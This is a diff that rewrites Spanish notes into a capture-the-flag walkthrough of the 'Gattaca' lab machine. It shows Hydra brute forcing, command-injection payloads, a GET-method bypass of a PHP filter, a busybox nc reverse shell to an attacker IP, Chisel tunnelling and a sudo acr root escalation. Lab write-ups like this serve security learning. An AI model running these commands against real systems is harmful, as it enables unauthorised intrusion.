@@ -1,107 +1,108 @@
+# Gattaca
 
-Añadimos el dominio gattaca.nyx en el /etc/hosts y hacemos un escaneo nmap:
+### Fase de Reconocimiento y Descubrimiento (Enumeración)
+
+#### Escaneo de Puertos (Nmap)
+
+Realizamos un escaneo de puertos inicial con nmap para identificar los servicios y versiones activas en la máquina objetivo:
 
 ![[Pasted image 20260823161146.png]]
 
-Puerto 80 HTTP abierto. 
+**Servicios identificados:**
 
-Hacemos un whatweb para ver tecnologias:
+* **Puerto 80/TCP (HTTP):** Servidor web Apache httpd 2.4.56 (Debian). Ver teoría en [HTTP & HTTPS.md](<../../../Pentesting Notes/1_Enumeration/HTTP & HTTPS.md>).
+* **Resolución de Nombres:** Para interactuar adecuadamente con el servicio web y los posibles Virtual Hosts, añadimos la entrada correspondiente al archivo `/etc/hosts`:
+
+```text
+192.168.1.X gattaca.nyx
+```
+
+***
+
+### Enumeración Web y de Servicios
+
+#### Inspección del Servidor Web (WhatWeb)
+
+Analizamos las tecnologías y cabeceras del servidor web mediante `whatweb`:
 
 ![[Pasted image 20260823161224.png]]
 
-Y entramos a la web:
+Accedemos a través del navegador a `http://gattaca.nyx`, encontrándonos con la página corporativa principal basada en la película *Gattaca*:
 
 ![[Pasted image 20260823161242.png]]
 
-AL ver el codigo fuente no se ve mucha cosa interesante, asi que haremos un fuzzing de archivos o directorios:
+Al inspeccionar el código fuente HTML no se identifican comentarios o recursos expuestos relevantes, por lo que procedemos a enumerar rutas y directorios ocultos.
 
+#### Fuzzing de Directorios Web (ffuf y dirsearch)
 
-**FFUF:**
+Realizamos fuzzing de rutas y recursos web mediante `ffuf`:
+
+```bash
+ffuf -u "http://gattaca.nyx/FUZZ" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-big.txt -e .php,.txt,.html -t 40
+```
+
 ![[Pasted image 20260823161802.png]]
 
+De forma complementaria, ejecutamos `dirsearch` para obtener una visión estructurada del árbol de directorios:
 
-**DIRSEARCH:**
+```bash
+dirsearch -u http://gattaca.nyx/
+```
+
+Ver guía y opciones avanzadas en [Fuzzing Cheat Sheet](<../../../Pentesting Notes/Web/Fuzzing/Cheat Sheet.md>).
 
 ![[Pasted image 20260823161952.png]]
 
-Hemos encontrado unos directorios curiosos:
+**Directorios y recursos identificados:**
+1. `/cards` (y `/cards.php`)
+2. `/images`
+3. `/fonts`
 
-1. cards
-2. images
-3. fonts
+#### Autenticación Básica HTTP y Fuerza Bruta (Hydra)
 
+Al acceder al recurso `/cards.php`, el servidor web solicita autenticación mediante una ventana emergente de **HTTP Basic Authentication**:
 
-Lo demas n o tiene nada de info excepto **cards** que tiene un inicio de sesion http basico:
 ![[Pasted image 20260824145522.png]]
 
-Asi que intentamos un ataque de fuerza bruta a este inciio de sesión. En este tipo de inciio de sesion las credenciales se envian en base64 y no en json:
+En este esquema de autenticación estándar, las credenciales viajan codificadas en Base64 en la cabecera HTTP `Authorization: Basic <base64>`. Al no requerir formularios complejos ni tokens CSRF, procedemos a realizar un ataque de fuerza bruta con `hydra` utilizando el diccionario de credenciales por defecto `ftp-betterdefaultpasslist.txt`:
 
-
-
-
-```
+```bash
 hydra -C /usr/share/wordlists/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt gattaca.nyx http-get /cards.php -s 80
 ```
 
 ![[Pasted image 20260824145912.png]]
 
-Y encontramos el user y contraseña:
+* **Credenciales válidas obtenidas:**
 
-```
+```text
 admin:admin12345
 ```
 
-Y nos encontramos con esto:
+***
+
+### Fase de Explotación / Intrusión
+
+#### Análisis de la Interfaz y Detección de WAF
+
+Tras autenticarnos en `/cards.php`, accedemos a un panel donde se listan diversos archivos correspondientes a registros de empleados:
 
 ![[Pasted image 20260824145956.png]]
 
-Si ponemos esos archivos no ocurre nada en el buscados, pero si intentamos poner otro archivo coo **/etc/passwd** nos salta el WAF:
+Al intentar solicitar archivos críticos del sistema operativo (como `/etc/passwd`) para probar un posible Path Traversal / LFI, el servidor deniega la solicitud inmediatamente mediante un filtro/WAF:
 
 ![[Pasted image 20260824150833.png]]
 
-
-Se analiza la request y se envia algo asi:
+Interceptamos la petición con Burp Suite para analizar el flujo exacto de datos:
 
 ![[Pasted image 20260824182050.png]]
 
-Lo primero que se me vino a la mente es un **Path Traversal**, ya que veo un campo que se llama filename y lo que seme ocurre es que le servidor obtenga ese campo y lo envie a una funcion que lea o cambie de directorio para leer x archivo. 
+La interfaz envía una petición HTTP POST con el parámetro `filename`. Inicialmente se evaluaron técnicas de evasión de Path Traversal (codificaciones URL simples `%2e%2e%2f`, dobles `%252e%252e%252f`, secuencias `....//`), pero todas resultaron bloqueadas. 
 
-Asi que pruebo varios payloads:
+#### Análisis de Código Fuente y Vulnerabilidad de Discrepancia de Métodos ($_REQUEST vs $_POST)
 
-1. Classico=../../../../../../../../etc/passwd
-2. Doble = ....//....//....//....//etc/passwd
-3. URL encoding = %2e%2e%2f%252e%252e%252f
-4. Doble URL encoding %252e%252e%252f%252e%252e%252f
-.... Ver la Cheat Sheet de URL encoding
-
-Pero hay un filtro que bloquea todo
-
-Pero luego pensé, y si realment eel codigo no cambia de directorio sino que ejecuta una funcion como exec o system de php. Aqui ya no seria un **Path Traversal** sino un Command Injection. Asi que probamos payloads de Command Injection:
-
-1. ;ls;
-2. &ls
-3. &&ls
-4. ||ls
-5. `ls`
-Pero claro tambien habia que tener en cuenta que y si la funcion que se ejecuta es algo por el estilo:
-
-```php
-exec(cat /ruta/ruta/${filename})
-```
-
-claro ahi ya no sirve la mayoria de payloads, solo el de punto y coma (,) pero igualmente el WAF los bloqueaba. 
-
-Asi que pensé en cambiar de metodo HTTP de POST a GET, y funcionó. INtentando escapar del comando con punto y coma pero enviandolo como get, obtenia un COmmand INjection y podia ejecutar comandos en el sistema:
-
-![[Pasted image 20260824182805.png]]
-
-
-
-Para ver la vulnerabilidad en detalle he hecho un cat del archivo cards.php para entender el codigo:
+Al profundizar en la arquitectura del backend y evaluar el archivo `cards.php`, se observa la siguiente implementación en PHP:
 
 ![[Pasted image 20260824183350.png]]
-
-Codigo php :
 
 ```php
 <?php
@@ -120,26 +121,41 @@ Codigo php :
         }
         }
 ?>
-
 ```
 
-EL problema es que REQUEST puede ser tanto para POST,  como para GET (explicar la vulnerabilidad bien).
+**Análisis de la Vulnerabilidad (Command Injection vía Method Tampering):**
+* La superglobal `$_REQUEST` en PHP combina por defecto los datos recibidos mediante `$_GET`, `$_POST` y `$_COOKIE`.
+* El script valida la ausencia de caracteres especiales mediante la expresión regular `preg_match('/[^A-Za-z0-9. _-]/', $_POST['filename'])`, pero únicamente sobre la superglobal `$_POST`.
+* Sin embargo, la función `shell_exec("cat " . $_REQUEST['filename'])` concatena directamente el valor proveniente de `$_REQUEST['filename']`.
+* **Vector de Evasión:** Si enviamos la petición utilizando el método **GET** (`GET /cards.php?filename=;id;`), la variable `$_POST['filename']` resulta nula (superando la comprobación `preg_match` sin lanzar error), mientras que `$_REQUEST['filename']` toma el valor enviado por GET, ejecutando el comando arbitrario inyectado.
 
-Asi que nos ponemos en escucha para obtener una reverse shell:
+Probamos la ejecución de comandos enviando el payload vía GET:
 
-Y enviamos el payload siguiente ya que sabemos que es un Debian
-(URL ENCODED):
+![[Pasted image 20260824182805.png]]
 
+* **Impacto:** Confirmamos **Command Injection** y ejecución remota de comandos en el servidor.
+
+#### Explotación de Reverse Shell Inicial (Usuario www-data)
+
+Nos ponemos en escucha en nuestra máquina atacante mediante Netcat:
+
+```bash
+nc -lvnp 4444
 ```
+
+Enviamos el comando de conexión reversa con `busybox nc` codificado en URL:
+
+```text
 busybox+nc+10.10.10.20+4444+-e+bash
 ```
 
+Recibimos la conexión reversa en el listener:
 
 ![[Pasted image 20260824195518.png]]
 
-APLicamos la tty:
+Estabilizamos la terminal para disponer de una TTY interactiva y funcional:
 
-```zsh
+```bash
 script /dev/null -c bash
 # (Presionar CTRL+Z para suspender la shell)
 stty raw -echo; fg
@@ -148,16 +164,19 @@ export TERM=xterm && export SHELL=bash
 stty rows 29 columns 111
 ```
 
+***
 
-AHora intentaremos subir privilegios ya que somos www-data. 
+### Movimiento Lateral / Escalada a Usuario (i.cassini)
 
-Al buscar entre carpetas, vemos un archivo llamado ftppolicy.txt:
+#### Enumeración Interna y Descubrimiento de ftppolicy.txt
+
+Al enumerar el sistema de archivos desde la cuenta `www-data`, localizamos un archivo de políticas en `/var/www/ftppolicy.txt`:
 
 ![[Pasted image 20260824200147.png]]
 
-(Antiravity te pego esteo para que hagas un miniresumillo cuando resumas esto)
+**Contenido de la política:**
 
-``` 
+```text
 ** IMPORTANT **
 Remember, when changing your password it must contain these requirements:
 
@@ -165,122 +184,92 @@ Remember, when changing your password it must contain these requirements:
 2. Must contain numbers
 3. Must contain special characters
 
-
 Don't waste time with v.freeman and rockyou.txt
-
 ```
 
-Asi que sabemos que el usuario v.freeman no es el que queremos sino el i.cassini y la wordlist rockyou no funcionará. Asi que hay que hacer OSINT y crear una worfdlist especial para este usuario. 
+**Análisis de la información:**
+* Se descarta al usuario `v.freeman` y los diccionarios genéricos como `rockyou.txt`.
+* El objetivo se centra en la usuaria del sistema **`i.cassini`** (*Irene Cassini*).
+* La contraseña cumple un patrón estricto: mínimo 8 caracteres, números y caracteres especiales (incluyendo combinaciones leet speak).
 
+#### Detección del Servicio FTP Local y Limitación de Firewall
 
-Creamos una wordlist base con le nombre y permutaciones:
-
-```
-cat > irene_base.txt << 'EOF'
-irene
-cassini
-irenecassini
-cassiniirene
-i
-cassini
-i.cassini
-irene.cassini
-icassini
-cassini.i
-cassiniirene
-irenec
-ireneca
-cassiniirene
-EOF
-```
-
-Ahora creamos las reglas:
+Al consultar los puertos en escucha internamente con `ss -tulnp`:
 
 ```bash
-cat > irene_rules.rule << 'EOF'
-
-:
-c
-u
-l
-
-so0
-sa@
-se3
-si1
-ss$
-..SNIP..
+ss -tulnp
 ```
 
-Y por ultimo ocn hashcat creamos la wordlist:
-
-```bash
-hashcat --force irene_base.txt -r irene_rules.rule --stdout | sort -u > irene_wordlist.txt
-```
-
-Y claro, no tenemos ssh pero como hemos visto un archivo llamado ftppolicies.txt y a la vez si ejecutamos el comando **ss -tulnp** obtenemos:
-
-```
-www-data@gattaca:/var/www$ ss -tulnp
+```text
 Netid     State      Recv-Q     Send-Q          Local Address:Port           Peer Address:Port     Process     
 udp       UNCONN     0          0                     0.0.0.0:68                  0.0.0.0:*                    
 tcp       LISTEN     0          32                    0.0.0.0:21                  0.0.0.0:*                    
 tcp       LISTEN     0          511                         *:80                        *:*      
 ```
 
-El problema esque solo esta abierto desde dentro, no podemos acceder desde fuera. NO tenemos opcion de cambiar el firewall ya que no tenemos permisos. Asi que la unica forma es con la herramienta llamada **chisel**. 
+Identificamos que el servicio **FTP (puerto 21)** se encuentra activo internamente, pero el firewall bloquea el tráfico entrante desde la red externa. Al no contar con privilegios para modificar `iptables`, recurrimos al establecimiento de un túnel de reenvío de puertos.
 
-Chisel permite crear un tunnel TCP/UDP y llevarlo sobre HTTP. Asi que usaremos eso para hacer una especia de port forwarding para aceder a ftp. 
+#### Reenvío de Puertos Remoto con Chisel (Reverse Port Forwarding)
 
-Descargamos el chisel:
+Utilizamos la herramienta **Chisel** para crear un túnel TCP cifrado sobre HTTP y redirigir el puerto 21 interno de la máquina víctima hacia un puerto local en nuestra máquina atacante:
 
-```
+1. Descargamos y transferimos el binario de Chisel a la máquina víctima:
+
+```bash
 wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
+gzip -d chisel_1.9.1_linux_amd64.gz
+chmod +x chisel_1.9.1_linux_amd64
 ```
-
-Y lo descomprimimos, le damos permisos y lo subimos a la maquina victima habiendo tenido antes un servidor en python:
 
 ![[Pasted image 20260824204046.png]]
 
-UNa vez esto inicamos el servidor (que estara en nuestra maquina):
+2. En nuestra máquina atacante, iniciamos Chisel en modo servidor (`reverse`) a la escucha en el puerto 6000:
 
-```
+```bash
 ./chisel_1.9.1_linux_amd64 server -p 6000 --reverse
 ```
 
 ![[Pasted image 20260824204110.png]]
 
-y desde la maquina victima, inciiamos el modo cliente:
+3. En la máquina víctima, ejecutamos el cliente de Chisel redirigiendo el puerto FTP (`127.0.0.1:21`) hacia el puerto local `2121` del atacante:
 
-```
+```bash
 ./chisel_1.9.1_linux_amd64 client 192.168.11.111:6000 R:2121:127.0.0.1:21
 ```
 
 ![[Pasted image 20260824204239.png]]
 
-AHora en el puerto 2121 de mi ordenador, dle ordenador atacante se redirigirá las peticiones al puerto 21 de la victima y todo por el puerto 6000. Hacer un mini esquema si se puede . 
+**Esquema de Red del Túnel Reverso:**
 
-Y ahora intentamos hydra con el comando:
-
+```mermaid
+flowchart LR
+    subgraph Atacante ["Máquina Atacante (192.168.11.111)"]
+        HYDRA["Hydra / Cliente FTP<br>(127.0.0.1:2121)"]
+        CH_SERV["Chisel Server<br>(Puerto 6000)"]
+    end
+    subgraph Victima ["Máquina Víctima (Gattaca)"]
+        CH_CLI["Chisel Client"]
+        FTP_SRV["Servicio FTP Interno<br>(127.0.0.1:21)"]
+    end
+    CH_CLI -->|"Túnel Reverso TCP"| CH_SERV
+    HYDRA -->|"Petición FTP"| CH_SERV
+    CH_SERV -.->|"Forwarding"| CH_CLI
+    CH_CLI -->|"Acceso Local"| FTP_SRV
 ```
-hydra -l i.cassini -P irene_wordlist.txt ftp://127.0.0.1 -s 2121 -t 4 -f -vV
-```
 
-Esta wordlist no ha funcionado, asi que utilizaremos otra herramienta paracrear la wordlist, esta es llamada **cupp**:
+#### Generación de Diccionario Personalizado con CUPP y Fuerza Bruta FTP
 
-```
+Con el puerto accesible localmente en `127.0.0.1:2121`, generamos un diccionario dirigido mediante **CUPP** (*Common User Passwords Profiler*), incorporando los datos personales del contexto de la película (*Irene Cassini*, pareja *Vincent Freeman*), sustituciones alfanuméricas (*leet mode*), caracteres especiales y números al final:
+
+```bash
 git clone https://github.com/Mebus/cupp.git
-```
-
-asi que nos ponemos en modo interactivo:
-
-```
+cd cupp
 python3 cupp.py -i
 ```
 
-Y contestamos a las preguntas:
+Parámetros introducidos en el asistente interactivo:
 
-```
+```text
 First Name: Irene
 Surname: Cassini
 Nickname: (vacío)
@@ -303,45 +292,82 @@ Add random numbers at the end of words?: Y
 Leet mode (e.g. 1337)?: Y
 ```
 
-y encontramos la contraseña del usuario:
+Lanzamos el ataque de fuerza bruta con `hydra` contra el puerto local reenviado 2121:
+
+```bash
+hydra -l i.cassini -P irene_wordlist.txt ftp://127.0.0.1 -s 2121 -t 4 -f -vV
+```
 
 ![[Pasted image 20260824212743.png]]
 
+* **Credenciales descubiertas:**
 
-```
+```text
 i.cassini:1r3n3!$%
 ```
 
-Nos conectamos por FTP:
+#### Conexión FTP y Obtención de Flag de Usuario (user.txt)
+
+Nos autenticamos en el servicio FTP con las credenciales de `i.cassini`:
 
 ![[Pasted image 20260824224532.png]]
 
+Leemos la flag de usuario (`user.txt`):
 
-Y ahi esta la flag:
-
+```bash
+cat user.txt
+# d3eca2e0a0755197605edc2eaa6be710
 ```
-www-data@gattaca:/tmp/chisel$ cat user.txt 
-d3eca2e0a0755197605edc2eaa6be710
-```
 
-Ahora hay que escalar, ya estamos en el usuario i.cassini tambien:
+Iniciamos sesión / cambiamos al usuario `i.cassini` en la terminal:
 
 ![[Pasted image 20260824231015.png]]
 
-SI hacemos **sudo -l** lo tipico para ver si el usuario tiene permisos d eejecuta ralgo como root vemos:
+***
+
+### Escalada de Privilegios a Root
+
+#### Enumeración de Permisos Sudoers (sudo -l)
+
+Comprobamos los privilegios `sudo` asignados al usuario `i.cassini`:
+
+```bash
+sudo -l
+```
 
 ![[Pasted image 20260824232431.png]]
 
-SI buscamos en GTFObins que es acr, vemos que hay tres lineas que podemos ejecutar para escalar a root:
+* **Hallazgo:** El usuario dispone de permisos para ejecutar el binario `/usr/bin/acr` como superusuario sin proporcionar contraseña (`NOPASSWD`):
 
-```zsh
+```text
+(root) NOPASSWD: /usr/bin/acr
+```
+
+#### Explotación de Binario ACR (GTFOBins)
+
+La herramienta `acr` (*Auto-Configure and Makefile generator*) incluye la opción `-r` para procesar y ejecutar scripts de configuración de forma automática. De acuerdo con GTFOBins, podemos crear un archivo de configuración arbitrario que invoque un comando de shell (`/bin/sh`):
+
+1. Creamos el archivo de configuración malicioso en `/tmp`:
+
+```bash
 echo -e 'x:\n\t/bin/sh 1>&0 2>&0' > /tmp/exploit.acr
 cd /tmp
 chmod +x exploit.acr
-acr -r ./exploit.acr
 ```
 
-SI lo ejecutamos:
+2. Ejecutamos `acr` mediante `sudo` apuntando al script:
 
+```bash
+sudo acr -r ./exploit.acr
+```
 
 ![[Pasted image 20260824233342.png]]
+
+* **Control Total:** Se genera una shell interactiva con máximos privilegios (`uid=0(root)`), obteniendo acceso administrativo absoluto a la máquina y procediendo a la lectura de la flag final `root.txt`.
+
+***
+
+### Relaciones y Conceptos
+
+* **Teoría:** [HTTP & HTTPS.md](<../../../Pentesting Notes/1_Enumeration/HTTP & HTTPS.md>), [FTP.md](<../../../Pentesting Notes/1_Enumeration/FTP.md>), [Fuzzing Cheat Sheet](<../../../Pentesting Notes/Web/Fuzzing/Cheat Sheet.md>), [Password Cracking.md](<../../../Pentesting Notes/2_Password-Attacks/Password Cracking.md>), [Linux Privilege Escalation - Permissions.md](<../../../Pentesting Notes/3_Post-Explotation/Linux Privilage Escalation/Permissions.md>)
+* **Laboratorios Relacionados:** [Bola](../Medio/Bola.md) (Comparte entorno Vulnyx, túneles de port forwarding y explotación de servicios locales), [JarJar](../Medio/JarJar.md) (Comparte resolución por VHosts, bypass de controles web y acceso al sistema), [Express](../Medio/Express.md) (Comparte resolución por VHosts y enumeración web), [Internal](../../DockerLabs/Facil/Internal.md) (Comparte port forwarding y explotación de servicios internos)
